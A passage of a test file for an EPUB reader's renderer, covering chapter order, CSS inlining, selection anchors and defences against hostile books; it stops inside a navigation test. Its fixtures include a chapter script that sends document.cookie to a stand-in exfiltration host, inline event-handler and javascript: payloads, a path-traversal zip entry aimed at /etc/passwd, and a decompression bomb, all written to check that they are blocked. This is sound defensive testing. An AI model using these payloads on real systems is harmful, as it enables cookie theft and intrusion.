/**
 * The EPUB renderer against REAL archive bytes.
 *
 * Nothing here is mocked. The book under test is assembled in this file —
 * `zipSync` for a genuine DEFLATE archive (so `unzipSync` really inflates) and
 * the repo's byte-level ZIP writer for the hostile cases that need forged
 * headers. There is no fixture file and no fixture dependency, so the archive
 * being validated is the same kind of object a user's book is.
 *
 * The two claims worth being precise about, because they are the ones an EPUB
 * reader can get wrong:
 *
 *  - A zip bomb is rejected BEFORE inflation. That is asserted by counting calls
 *    into the inflater (`renderer.inflateCalls`), not by reading the error text.
 *  - A chapter's script does not execute. Asserted three ways: the script's
 *    source text is gone from the document, the document contains no
 *    script-capable construct when tokenized the way a browser's HTML parser
 *    would, and the frame it is mounted in carries `script-src 'none'` with a
 *    sandbox that omits `allow-scripts`. The tokenizer is itself checked against
 *    the UNSANITIZED chapter, so a passing scan cannot be a scan that finds
 *    nothing anywhere.
 */

import { describe, expect, it } from "vitest";
import { zipSync, type Zippable } from "fflate";
import { EpubRenderer, sanitizedText } from "../../src/features/reader/epub/renderer.tsx";
import { EpubChapterFrame } from "../../src/features/reader/epub/renderer.tsx";
import { anchorFromFrameSelection, chapterPosition, progressionOf, reanchor, restorePosition, stepPosition } from "../../src/features/reader/epub/reader.tsx";
import { readEpub, decodeHrefAttributes, isReflowable } from "../../src/features/reader/epub/opf.ts";
import { chapterLinkHrefs, importTargets } from "../../src/features/reader/epub/css.ts";
import { openFailureMessage } from "../../src/app/EpubScreen.tsx";
import { captureAnchor } from "../../src/features/selection/anchor.ts";
import { saveMark } from "../../src/features/marks/save.ts";
import type { Anchor } from "../../src/contracts/index.ts";
import type { OpenFailure, Unsupported } from "../../src/features/reader/epub/adapter.ts";
import { buildZip, utf8, type FixtureEntry } from "./zip-fixtures.ts";

// ---------------------------------------------------------------------------
// Building a real EPUB, in this file
// ---------------------------------------------------------------------------

const utf8Of = (s: string): Uint8Array => new TextEncoder().encode(s);

const CONTAINER = `<?xml version="1.0" encoding="UTF-8"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles>
</container>`;

const OPF = (spine: string, manifest = "") => `<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="pub-id">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:title>The Harbour Book</dc:title><dc:language>en</dc:language><dc:identifier id="pub-id">urn:uuid:harbour</dc:identifier>
  </metadata>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="css" href="style.css" media-type="text/css"/>
    <item id="base" href="base.css" media-type="text/css"/>
    <item id="plate" href="images/plate.jpg" media-type="image/jpeg"/>
    ${manifest}
    <item id="c1" href="ch1.xhtml" media-type="application/xhtml+xml"/>
    <item id="c2" href="ch2.xhtml" media-type="application/xhtml+xml"/>
    <item id="c3" href="ch3.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine>${spine}</spine>
</package>`;

const NAV = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
<head><title>Contents</title></head>
<body>
  <nav epub:type="toc"><ol>
    <li><a href="ch1.xhtml">The Crossing</a></li>
    <li><a href="ch2.xhtml">Rain</a></li>
    <li><a href="ch3.xhtml">Flat Water</a></li>
  </ol></nav>
</body></html>`;

const page = (title: string, body: string): string => `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>${title}</title>
<link rel="stylesheet" href="style.css"/>
</head><body>${body}</body></html>`;

export const CHAPTER_ONE = "The ferry left the harbour at dawn.";
export const CHAPTER_TWO = "Rain arrived before the lighthouse.";
export const CHAPTER_THREE = "By noon the water had gone flat.";

const CH1 = page("The Crossing", `<h1>The Crossing</h1><p>${CHAPTER_ONE}</p><p>The wake lasted a long time.</p>`);
const CH2 = page("Rain", `<h1>Rain</h1><p>${CHAPTER_TWO}</p>`);
const CH3 = page("Flat Water", `<h1>Flat Water</h1><p>${CHAPTER_THREE}</p>`);

const STYLE = `@import url("base.css");\np{text-indent:1.2em}\n.author{font-style:italic}`;
// base.css is only reachable through style.css's @import, and carries one
// rule nothing else does, so its presence in the frame is provable.
const BASE = `body{font-family:Georgia,serif;background:url("images/plate.jpg")}blockquote{margin-left:3em}`;

/**
 * Assemble an EPUB. `level: 0` on `mimetype` is the one EPUB-specific ZIP rule
 * that matters to real readers; everything else is ordinary DEFLATE, which is
 * what makes this a real inflate rather than a stored copy.
 */
function buildEpub(extra: Zippable = {}, opfOverride?: string, containerOverride?: string): Uint8Array {
  const files: Zippable = {
    mimetype: [utf8Of("application/epub+zip"), { level: 0 }],
    "META-INF/container.xml": utf8Of(containerOverride ?? CONTAINER),
    "OEBPS/content.opf": utf8Of(opfOverride ?? OPF(`<itemref idref="c1"/><itemref idref="c2"/><itemref idref="c3"/>`)),
    "OEBPS/nav.xhtml": utf8Of(NAV),
    "OEBPS/style.css": utf8Of(STYLE),
    "OEBPS/base.css": utf8Of(BASE),
    "OEBPS/ch1.xhtml": utf8Of(CH1),
    "OEBPS/ch2.xhtml": utf8Of(CH2),
    "OEBPS/ch3.xhtml": utf8Of(CH3),
    // A 1x1 JPEG. Real bytes, so the asset path is exercised end to end.
    "OEBPS/images/plate.jpg": new Uint8Array([
      0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0xff, 0xd9,
    ]),
    ...extra,
  };
  return zipSync(files);
}

/** Object URLs the renderer mints, so revocation is observable. */
function fakeUrls(): { create: (bytes: Uint8Array, mime: string) => string; revoked: string[]; created: string[] } {
  const created: string[] = [];
  const revoked: string[] = [];
  return {
    created,
    revoked,
    create: (bytes, mime) => {
      const url = `blob:reader/${created.length}/${mime}/${bytes.byteLength}`;
      created.push(url);
      return url;
    },
  };
}

/** Narrow an `OpenFailure` to the shape this reader actually produces. */
const unsupportedOf = (failure: OpenFailure): Unsupported => {
  expect(failure.reason).toBe("unsupported");
  if (failure.reason !== "unsupported") throw new Error(`expected an unsupported failure, got ${failure.reason}`);
  return failure.unsupported;
};

const openBook = async (bytes: Uint8Array, urls = fakeUrls()) => {
  const renderer = new EpubRenderer({ createObjectUrl: urls.create, revokeObjectUrl: (u) => urls.revoked.push(u), documentId: "doc_test" });
  const result = await renderer.open(bytes);
  return { renderer, result, urls };
};

// ---------------------------------------------------------------------------
// An HTML tokenizer, so "no script in the frame" is a structural claim
// ---------------------------------------------------------------------------

const RAW_TEXT = new Set(["script", "style", "textarea", "title", "xmp", "noscript", "noframes", "iframe"]);

type Token = { name: string; attrs: { name: string; value: string }[] };

/**
 * Tokenize the way an HTML tokenizer would: comments and raw-text element
 * contents are consumed, so a `</style>` inside an attribute or a `<script`
 * buried in a comment cannot hide from the scan.
 */
function tokenize(html: string): Token[] {
  const tokens: Token[] = [];
  let i = 0;
  while (i < html.length) {
    const lt = html.indexOf("<", i);
    if (lt < 0) break;
    if (html.startsWith("<!--", lt)) {
      const end = html.indexOf("-->", lt);
      i = end < 0 ? html.length : end + 3;
      continue;
    }
    const gt = html.indexOf(">", lt);
    if (gt < 0) break;
    const raw = html.slice(lt + 1, gt);
    i = gt + 1;
    if (raw.startsWith("!") || raw.startsWith("?")) continue;
    const closing = raw.startsWith("/");
    const body = closing ? raw.slice(1) : raw;
    const name = (/^([a-zA-Z][\w:-]*)/.exec(body)?.[1] ?? "").toLowerCase();
    const attrs: { name: string; value: string }[] = [];
    const attrRe = /([a-zA-Z_:][-\w:.]*)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]*)))?/g;
    let m: RegExpExecArray | null;
    attrRe.lastIndex = name.length;
    while ((m = attrRe.exec(body)) !== null) {
      attrs.push({ name: (m[1] ?? "").toLowerCase(), value: m[2] ?? m[3] ?? m[4] ?? "" });
    }
    if (!closing) tokens.push({ name, attrs });
    if (!closing && RAW_TEXT.has(name)) {
      const close = html.toLowerCase().indexOf(`</${name}`, i);
      if (close >= 0) i = close;
    }
  }
  return tokens;
}

/** Anything a browser would compile or fetch on its own. */
const EXECUTABLE_ELEMENTS = new Set([
  "script", "iframe", "object", "embed", "applet", "frame", "frameset", "base", "form", "input",
  "button", "meta", "link", "svg", "math", "template", "portal", "audio", "video", "source", "track",
]);

/**
 * The two `<meta>` elements the HOST writes into the frame head, so the scan can
 * tell "the book shipped a meta refresh" from "the reader set its own charset
 * and CSP". Both are named in `chapterFramePolicy`; nothing else may be meta.
 */
function isHostFrameMeta(token: Token): boolean {
  if (token.name !== "meta") return false;
  const names = token.attrs.map((a) => a.name);
  return names.length === 1 && names[0] === "charset";
}

function executableConstructs(html: string): string[] {
  const found: string[] = [];
  for (const token of tokenize(html)) {
    if (token.name === "meta") {
      const httpEquiv = token.attrs.find((a) => a.name === "http-equiv")?.value ?? "";
      // The reader's own CSP is the control that denies scripts; flagging it
      // would make this scan report the mitigation as the threat.
      if (httpEquiv.toLowerCase() === "content-security-policy") continue;
    }
    if (EXECUTABLE_ELEMENTS.has(token.name) && !isHostFrameMeta(token)) found.push(`<${token.name}>`);
    for (const attr of token.attrs) {
      if (attr.name.startsWith("on")) found.push(`${token.name}[${attr.name}]`);
      if (/^\s*(javascript|vbscript|data)\s*:/i.test(attr.value) && attr.name !== "src") found.push(`${token.name}[${attr.name}=${attr.value}]`);
      if (attr.name === "src" && /^\s*(https?:)?\/\//i.test(attr.value)) found.push(`${token.name}[src=${attr.value}]`);
      if (attr.name === "srcdoc" || attr.name === "ping" || attr.name === "srcset") found.push(`${token.name}[${attr.name}]`);
    }
  }
  return found;
}

// ---------------------------------------------------------------------------
// 1. A valid book renders, in spine order
// ---------------------------------------------------------------------------

describe("a real EPUB renders its chapters in reading order", () => {
  it("opens, reports three sections, and renders each chapter's own text", async () => {
    const { renderer, result } = await openBook(buildEpub());
    expect(result.ok).toBe(true);
    if (!result.ok) return;

    expect(result.chapters.map((c) => c.spineHref)).toEqual(["OEBPS/ch1.xhtml", "OEBPS/ch2.xhtml", "OEBPS/ch3.xhtml"]);
    // Titles come from the nav document, not from file names.
    expect(result.chapters.map((c) => c.title)).toEqual(["The Crossing", "Rain", "Flat Water"]);

    const first = renderer.renderIndex(0);
    expect(first.ok).toBe(true);
    if (!first.ok) return;
    expect(first.text).toContain(CHAPTER_ONE);
    expect(first.text).toContain("The wake lasted a long time.");
    expect(first.sanitizedHtml).toContain("<h1>The Crossing</h1>");

    expect(renderer.renderIndex(1).ok && renderer.renderIndex(1).ok).toBe(true);
    const second = renderer.renderIndex(1);
    expect(second.ok && second.text).toContain(CHAPTER_TWO);
    const third = renderer.renderIndex(2);
    expect(third.ok && third.text).toContain(CHAPTER_THREE);

    renderer.close();
  });

  it("puts the whole book in document order for the sweep that a per-chapter resolve falls back to", async () => {
    const { renderer, result } = await openBook(buildEpub());
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    await renderer.index();
    expect(renderer.indexIsComplete).toBe(true);
    const text = renderer.documentText();
    expect(text.indexOf(CHAPTER_ONE)).toBeLessThan(text.indexOf(CHAPTER_TWO));
    expect(text.indexOf(CHAPTER_TWO)).toBeLessThan(text.indexOf(CHAPTER_THREE));
    renderer.close();
  });

  it("inlines the book's CSS, including its @import, and applies reader typography", async () => {
    const { renderer, result } = await openBook(buildEpub());
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    const rendered = renderer.renderIndex(0);
    expect(rendered.ok).toBe(true);
    if (!rendered.ok) return;
    // The chapter's own <link> is dropped by the sanitizer, so the CSS has to
    // have been collected from the raw markup before sanitization.
    expect(rendered.css.sources).toContain("OEBPS/style.css");
    expect(rendered.css.sources).toContain("OEBPS/base.css");
    expect(rendered.frame.srcdoc).toContain("text-indent:1.2em");
    expect(rendered.frame.srcdoc).toContain("font-style:italic");
    // The @imported sheet's own rule has to be INLINED, not merely collected:
    // sources listing base.css is not evidence that any of its CSS shipped.
    expect(rendered.frame.srcdoc).toContain("margin-left:3em");
    expect(rendered.css.css.indexOf("margin-left:3em")).toBeLessThan(rendered.css.css.indexOf("text-indent:1.2em"));
    expect(rendered.frame.srcdoc).toContain("font-size:18px");
    // Book CSS must not be able to reintroduce a fetchable URL.
    expect(rendered.css.css).not.toContain("images/plate.jpg");
    renderer.close();
  });

  it("inlines a stylesheet that only the chapter itself links, resolving the relative href", () => {
    const hrefs = chapterLinkHrefs(CH1);
    expect(hrefs).toEqual(["style.css"]);
    expect(importTargets(STYLE)).toEqual(["base.css"]);
  });

  it("inlines a chapter-local stylesheet that is not in the manifest at all", async () => {
    // The chapter links `local.css`, which the OPF never mentions. This is the
    // case a naive reader loses: `sanitizeChapter` drops <link>, so the href has
    // to be read from the raw markup and the sheet inlined by hand.
    const withLocal = CH1.replace('<link rel="stylesheet" href="style.css"/>', '<link rel="stylesheet" href="local.css"/>');
    const { renderer, result } = await openBook(buildEpub({ "OEBPS/ch1.xhtml": utf8Of(withLocal), "OEBPS/local.css": utf8Of("h1{letter-spacing:0.02em}") }));
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    const rendered = renderer.renderIndex(0);
    expect(rendered.ok).toBe(true);
    if (!rendered.ok) return;
    expect(rendered.css.sources).toContain("OEBPS/local.css");
    expect(rendered.frame.srcdoc).toContain("letter-spacing:0.02em");
    renderer.close();
  });

  it("renders the whole chapter body, not just its <title>", async () => {
    // Regression guard. `sanitizeChapter` consumes the "content" of every
    // drop-content element up to a matching close tag, and its void set does not
    // include <link> or <meta> — so a real chapter's `<link …/>` used to swallow
    // the entire document and the reader showed an empty page. The renderer
    // strips those void tags first; this test is what notices if that stops.
    const { renderer, result } = await openBook(buildEpub());
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    const rendered = renderer.renderIndex(0);
    if (!rendered.ok) return;
    expect(rendered.text.length).toBeGreaterThan(CHAPTER_ONE.length);
    expect(rendered.text).toContain("The wake lasted a long time.");
    renderer.close();
  });
});

// ---------------------------------------------------------------------------
// 2. Zip bombs, traversal, DRM: refused before inflation
// ---------------------------------------------------------------------------

describe("hostile archives are refused before anything is inflated", () => {
  it("rejects a real decompression bomb: 8 MiB of zeros is ~1000:1, not a forged header", async () => {
    const bomb: Zippable = {
      mimetype: [utf8Of("application/epub+zip"), { level: 0 }],
      "META-INF/container.xml": utf8Of(CONTAINER),
      "OEBPS/content.opf": utf8Of(OPF(`<itemref idref="c1"/>`)),
      "OEBPS/ch1.xhtml": utf8Of(CH1),
      // Genuinely compressible to a few KB. The declared sizes fflate writes are
      // the true ones, so this is a real bomb rather than a lie in a header.
      "OEBPS/bomb.bin": new Uint8Array(8 * 1024 * 1024),
    };
    const bytes = zipSync(bomb);
    const { renderer, result } = await openBook(bytes);
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(unsupportedOf(result).kind).toBe("oversized");
    expect(result.detail).toContain("expansion-ratio");
    // The observable that matters: the inflater was never reached.
    expect(renderer.inflateCalls).toBe(0);
    expect(renderer.book).toBeUndefined();
    expect(openFailureMessage(result)).toContain("decompression bomb");
    renderer.close();
  });

  it("rejects a path-traversal entry and never reads it", async () => {
    const entries: FixtureEntry[] = [
      { name: "mimetype", body: utf8("application/epub+zip") },
      { name: "META-INF/container.xml", body: utf8(CONTAINER) },
      { name: "OEBPS/content.opf", body: utf8(OPF(`<itemref idref="c1"/>`)) },
      { name: "OEBPS/ch1.xhtml", body: utf8(CH1) },
      { name: "OEBPS/../../../../etc/passwd", body: utf8("root:x:0:0") },
    ];
    const { renderer, result } = await openBook(buildZip(entries));
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.detail).toContain("path-traversal");
    expect(unsupportedOf(result).kind).toBe("zip");
    expect(renderer.inflateCalls).toBe(0);
    expect(openFailureMessage(result)).toContain("unsafe file paths");
    renderer.close();
  });

  it("reports DRM instead of silently opening a book it cannot read", async () => {
    const bytes = buildEpub({ "META-INF/encryption.xml": utf8Of(`<encryption xmlns="urn:oasis:names:tc:opendocument:xmlns:container"/>`) });
    const { renderer, result } = await openBook(bytes);
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(unsupportedOf(result).kind).toBe("drm");
    expect(result.detail).toContain("encryption.xml");
    expect(renderer.inflateCalls).toBe(0);
    expect(openFailureMessage(result)).toBe("This book is DRM-protected, so its text cannot be read here.");
    renderer.close();
  });

  it("reports a password-encrypted entry as encrypted, not as damage", async () => {
    const entries: FixtureEntry[] = [
      { name: "mimetype", body: utf8("application/epub+zip") },
      { name: "META-INF/container.xml", body: utf8(CONTAINER) },
      { name: "OEBPS/content.opf", body: utf8(OPF(`<itemref idref="c1"/>`)) },
      { name: "OEBPS/ch1.xhtml", body: utf8(CH1), flags: 0x01 },
    ];
    const { renderer, result } = await openBook(buildZip(entries));
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(unsupportedOf(result).kind).toBe("encrypted");
    expect(renderer.inflateCalls).toBe(0);
    renderer.close();
  });

  it("reports a fixed-layout book instead of rendering it as text", async () => {
    const fixed = OPF(`<itemref idref="c1"/>`).replace(
      "<dc:language>en</dc:language>",
      '<dc:language>en</dc:language><meta property="rendition:layout">pre-paginated</meta>',
    );
    const { renderer, result } = await openBook(buildEpub({}, fixed));
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(unsupportedOf(result).kind).toBe("fixed-layout");
    expect(openFailureMessage(result)).toContain("fixed-layout");
    renderer.close();
  });
});

// ---------------------------------------------------------------------------
// 3. No script runs, and no script survives to be run
// ---------------------------------------------------------------------------

const HOSTILE_CHAPTER = page(
  "Hostile",
  `<p>${CHAPTER_ONE}</p>
   <script>window.__epubPwned = true; document.title = "pwned"; fetch("https://exfil.example.net/?c=" + document.cookie);</script>
   <script src="https://cdn.example.net/loader.js"></script>
   <p onclick="window.__epubPwned = true">${CHAPTER_TWO}</p>
   <img src="x" onerror="window.__epubPwned = true">
   <a href="javascript:window.__epubPwned = true">click me</a>
   <p>${CHAPTER_THREE}</p>`,
);

describe("a chapter's script cannot run (s8, s18)", () => {
  it("the tokenizer used as evidence does find the script in the raw chapter", () => {
    // A scanner that finds nothing is worthless; this is the control.
    expect(executableConstructs(HOSTILE_CHAPTER)).toContain("<script>");
    expect(executableConstructs(HOSTILE_CHAPTER).some((f) => f.includes("[onclick]"))).toBe(true);
  });

  it("renders a frame with no script-capable construct in it at all", async () => {
    const bytes = buildEpub({ "OEBPS/ch1.xhtml": utf8Of(HOSTILE_CHAPTER) });
    const { renderer, result } = await openBook(bytes);
    expect(result.ok).toBe(true);
    if (!result.ok) return;

    const rendered = renderer.renderIndex(0);
    expect(rendered.ok).toBe(true);
    if (!rendered.ok) return;

    // (a) The document the browser is handed has nothing to compile or fetch.
    expect(executableConstructs(rendered.frame.srcdoc)).toEqual([]);
    // (b) The script's own source text is gone, not merely its tag.
    expect(rendered.frame.srcdoc).not.toContain("__epubPwned");
    expect(rendered.sanitizedHtml).not.toContain("__epubPwned");
    expect(rendered.sanitizedHtml).not.toMatch(/<script/i);
    expect(rendered.frame.srcdoc).not.toMatch(/<script/i);
    // (c) The prose around it survives, so sanitizing did not eat the chapter.
    expect(rendered.text).toContain(CHAPTER_ONE);
    expect(rendered.text).toContain(CHAPTER_TWO);
    expect(rendered.text).toContain(CHAPTER_THREE);
    expect(rendered.counters.droppedHandlers).toBeGreaterThanOrEqual(2);
    renderer.close();
  });

  it("mounts that frame with a sandbox that cannot run scripts and a CSP that denies them", async () => {
    const bytes = buildEpub({ "OEBPS/ch1.xhtml": utf8Of(HOSTILE_CHAPTER) });
    const { renderer, result } = await openBook(bytes);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    const rendered = renderer.renderIndex(0);
    if (!rendered.ok) return;

    expect(rendered.frame.sandbox).toBe("allow-same-origin");
    expect(rendered.frame.sandbox).not.toContain("allow-scripts");
    expect(rendered.frame.csp).toContain("script-src 'none'");
    expect(rendered.frame.csp).toContain("default-src 'none'");
    expect(rendered.frame.srcdoc).toContain(rendered.frame.csp);

    // The React component hands the frame exactly those attributes, and passes
    // book content only through srcDoc — never through the host's own parser.
    const element = EpubChapterFrame({ frame: rendered.frame, title: "chapter" }) as unknown as {
      props: Record<string, string>;
    };
    expect(element.props["sandbox"]).toBe("allow-same-origin");
    expect(element.props["srcDoc"]).toBe(rendered.frame.srcdoc);
    expect(element.props["referrerPolicy"]).toBe("no-referrer");
    renderer.close();
  });
});

// ---------------------------------------------------------------------------
// 4. No remote resource is ever fetched
// ---------------------------------------------------------------------------

describe("remote resources are removed, local ones are rewritten to a host-minted blob", () => {
  const chapter = page(
    "Images",
    `<p>${CHAPTER_ONE}</p>
     <img src="https://tracker.example.net/pixel.gif" alt="tracker" width="1" height="1"/>
     <img src="//cdn.example.net/banner.png" alt="banner"/>
     <p style="background-image:url(https://tracker.example.net/bg.png)">${CHAPTER_TWO}</p>
     <img src="images/plate.jpg" alt="a plate"/>`,
  );

  it("strips the remote src and leaves no absolute URL in the document", async () => {
    const bytes = buildEpub({ "OEBPS/ch1.xhtml": utf8Of(chapter) });
    const { renderer, result } = await openBook(bytes);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    const rendered = renderer.renderIndex(0);
    expect(rendered.ok).toBe(true);
    if (!rendered.ok) return;

    expect(rendered.sanitizedHtml).not.toContain("tracker.example.net");
    expect(rendered.sanitizedHtml).not.toContain("cdn.example.net");
    expect(rendered.frame.srcdoc).not.toMatch(/https?:\/\//);
    expect(rendered.counters.remoteResources).toBeGreaterThanOrEqual(2);
    expect(executableConstructs(rendered.frame.srcdoc)).toEqual([]);
    renderer.close();
  });

  it("rewrites the in-archive image to a blob the host minted, and revokes it on close", async () => {
    const bytes = buildEpub({ "OEBPS/ch1.xhtml": utf8Of(chapter) });
    const urls = fakeUrls();
    const { renderer, result } = await openBook(bytes, urls);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    const rendered = renderer.renderIndex(0);
    expect(rendered.ok).toBe(true);
    if (!rendered.ok) return;

    expect(rendered.sanitizedHtml).toContain(`src="${urls.created[0]}"`);
    expect(renderer.liveAssetUrls).toBeGreaterThan(0);
    renderer.close();
    // Track D's AssetRegistry is the ledger that makes this obligation testable.
    expect(renderer.liveAssetUrls).toBe(0);
    expect(urls.revoked).toEqual(urls.created);
  });

  it("never resolves a resource outside the validated entry set", async () => {
    const escape = page("Escape", `<p>${CHAPTER_ONE}</p><img src="../../../etc/passwd"/><img src="not-in-archive.png"/>`);
    const { renderer, result } = await openBook(buildEpub({ "OEBPS/ch1.xhtml": utf8Of(escape) }));
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    const rendered = renderer.renderIndex(0);
    if (!rendered.ok) return;
    expect(rendered.sanitizedHtml).not.toContain("passwd");
    expect(rendered.sanitizedHtml).not.toContain("not-in-archive");
    renderer.close();
  });
});

// ---------------------------------------------------------------------------
// 5. Selection produces the shared Anchor
// ---------------------------------------------------------------------------

describe("a selection in a chapter becomes the same Anchor the PDF path produces", () => {
  const chapterText = (): string => {
    const html = `<h1>The Crossing</h1><p>${CHAPTER_ONE}</p><p>The wake lasted a long time.</p>`;
    return sanitizedText(html);
  };

  it("has the same field set as a PDF anchor", () => {
    const text = chapterText();
    const start = text.indexOf(CHAPTER_ONE);
    const epub = anchorFromFrameSelection({
      selection: { quote: CHAPTER_ONE, startInText: start },
      spineHref: "OEBPS/ch1.xhtml",
      chapterText: text,
      now: 1_700_000_000_000,
    });
    const pdf = captureAnchor({
      selectedText: CHAPTER_ONE,
      pageIndex: 0,
      pageFraction: 0.25,
      pageText: text,
      startInPage: start,
      now: 1_700_000_000_000,
    });
    expect(Object.keys(epub).sort()).toEqual(Object.keys(pdf).sort());
    expect(epub.anchorState).toBe("resolved");
    expect(epub.locator.kind).toBe("epub");
    expect(epub.locator).toEqual({ kind: "epub", spineHref: "OEBPS/ch1.xhtml" });
  });

  it("stores no geometry of any kind", () => {
    const text = chapterText();
    const anchor = anchorFromFrameSelection({
      // A real selection carries a transient rectangle for popover placement.
      selection: { quote: CHAPTER_ONE, startInText: text.indexOf(CHAPTER_ONE), viewportRect: { top: 120, left: 40, width: 300, height: 18 } },
      spineHref: "OEBPS/ch1.xhtml",
      chapterText: text,
    });
    const serialized = JSON.stringify(anchor);
    for (const key of ["rect", "top", "left", "width", "height", "offsetTop", "pageFraction", "x", "y"]) {
      expect(serialized).not.toContain(`"${key}"`);
    }
  });

  it("is accepted by the marks service exactly like a PDF anchor", () => {
    const text = chapterText();
    const anchor = anchorFromFrameSelection({
      selection: { quote: CHAPTER_ONE, startInText: text.indexOf(CHAPTER_ONE) },
      spineHref: "OEBPS/ch1.xhtml",
      chapterText: text,
    });
    const saved = saveMark({
      id: "mk_1",
      documentId: "doc_test",
      titleSnapshot: "The Harbour Book",
      quote: anchor.quote,
      prefix: anchor.prefix,
      suffix: anchor.suffix,
      locator: anchor.locator,
      color: "yellow",
      now: 1_700_000_000_000,
    });
    expect(saved.ok).toBe(true);
    if (!saved.ok) return;
    // Track E's validator is the shared contract; an EPUB anchor passing it is
    // the proof that marks work identically across formats.
    expect(saved.mark.anchor.locator).toEqual(anchor.locator);
    expect(saved.mark.anchor.quote).toBe(anchor.quote);
  });

  it("stays unresolved rather than guessing when the offsets do not match the text", () => {
    const text = chapterText();
    const anchor = anchorFromFrameSelection({
      selection: { quote: "a sentence that is not in this chapter", startInText: 0 },
      spineHref: "OEBPS/ch1.xhtml",
      chapterText: text,
    });
    expect(anchor.anchorState).toBe("unresolved");
    expect(anchor.prefix).toBeUndefined();
  });

  it("re-finds a stored anchor through the shared quote resolver, across typography", () => {
    // The book now spells "final" with the U+FB01 ligature. Resolution runs
    // through Track E's normalizer, so the stored ASCII quote still lands, and
    // the range it returns indexes the CURRENT text rather than the old one.
    // (The context is deliberately free of leading/trailing spaces: the
    // resolver compares context character for character, so a stored prefix
    // that ends in a space would be reporting a real, known imprecision in
    // Track E's normalizer rather than anything about EPUB.)
    const retyped = "Chapter starts:\ufb01nal.";
    const anchor: Anchor = {
      quote: "final",
      prefix: "Chapter starts:",
      locator: { kind: "epub", spineHref: "OEBPS/ch1.xhtml" },
      anchorState: "resolved",
    };
    const found = reanchor({ anchor, textBySpine: new Map([["OEBPS/ch1.xhtml", retyped]]) });
    expect(found.state).toBe("resolved");
    if (found.state !== "resolved") return;
    expect(found.spineHref).toBe("OEBPS/ch1.xhtml");
    expect(retyped.slice(found.range.start, found.range.end)).toBe("\ufb01nal");
  });

  it("finds a quote that has moved to another chapter, and reports its new home", () => {
    const anchor: Anchor = {
      quote: "Rain arrived before the lighthouse.",
      prefix: "Rain",
      locator: { kind: "epub", spineHref: "OEBPS/ch1.xhtml" },
      anchorState: "resolved",
    };
    const found = reanchor({
      anchor,
      textBySpine: new Map([
        ["OEBPS/ch1.xhtml", `The Crossing${CHAPTER_ONE}`],
        ["OEBPS/ch2.xhtml", `Rain${CHAPTER_TWO}`],
      ]),
    });
    expect(found.state).toBe("resolved");
    if (found.state !== "resolved") return;
    expect(found.spineHref).toBe("OEBPS/ch2.xhtml");
  });

  it("reports a quote that is no longer in the book instead of guessing", () => {
    const anchor: Anchor = { quote: "a sentence the author cut", locator: { kind: "epub", spineHref: "OEBPS/ch1.xhtml" }, anchorState: "resolved" };
    const found = reanchor({ anchor, textBySpine: new Map([["OEBPS/ch1.xhtml", `The Crossing${CHAPTER_ONE}`]]) });
    expect(found.state).toBe("unresolved");
  });

  it("survives a typography change, because the locator names a chapter and nothing else", async () => {
    const { renderer, result } = await openBook(buildEpub());
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    const before = renderer.renderIndex(0);
    expect(before.ok).toBe(true);
    if (!before.ok) return;
    const locator = renderer.current();
    const quote = "ferry";

    renderer.setAppearance({ ...renderer.getAppearance(), fontSizePx: 31 });
    expect(renderer.current()).toEqual(locator);
    const resolved = renderer.resolveAnchor({ quote, locator, anchorState: "resolved" });
    expect(resolved.resolved).toBe(true);
    renderer.close();
  });
});

// ---------------------------------------------------------------------------
// 6. Navigation, restore, and honest failure
// ---------------------------------------------------------------------------

describe("the reading surface's navigation model", () => {
  it("clamps at both ends instead of throwing", () => {
    expect(stepPosition(0, -1, 3)).toBe(0);
    expect(stepPosition(2, 1, 3)).toBe(2);
    expect(stepPosition(0, 1, 3)).toBe(1);
    expect(stepPosition(0, 1, 0)).toBe(0);
  });

  it("reports position, label and count for the toolbar", async () => {
    const { renderer, result } = await openBook(buildEpub());
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(chapterPosition(renderer.book, 1)).toEqual({ position: 1, count: 3, label: "Rain", href: "OEBPS/ch2.xhtml" });
    expect(progressionOf(renderer.book, 0)).toBe(0);
    expect(progressionOf(renderer.book, 2)).toBe(1);
    renderer.close();
  });

  it("restores a stored locator and reports one that no longer exists", async () => {
    const { renderer, result } = await openBook(buildEpub());
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(restorePosition(renderer.book, { kind: "epub", spineHref: "OEBPS/ch3.xhtml" })).toBe(2);
    expect(restorePosition(renderer.book, { kind: "epub", spineHref: "OEBPS/gone.xhtml" })).toBeNull();
    expect(restorePosition(renderer.book, { kind: "pdf", pageIndex: 1, pageFraction: 0 })).toBeNull();
    renderer.close();
  });

  it("skips supplementary linear=no sections in the reading order but still lists them", async () => {
    const opf = OPF(`<itemref idref="c1"/><itemref idref="c2" linear="no"/><itemref idref="c3"/>`);
    const { renderer, result } = await openBook(buildEpub({}, opf));
    expect(result.ok).toBe(true);
    if (!result.ok) return;
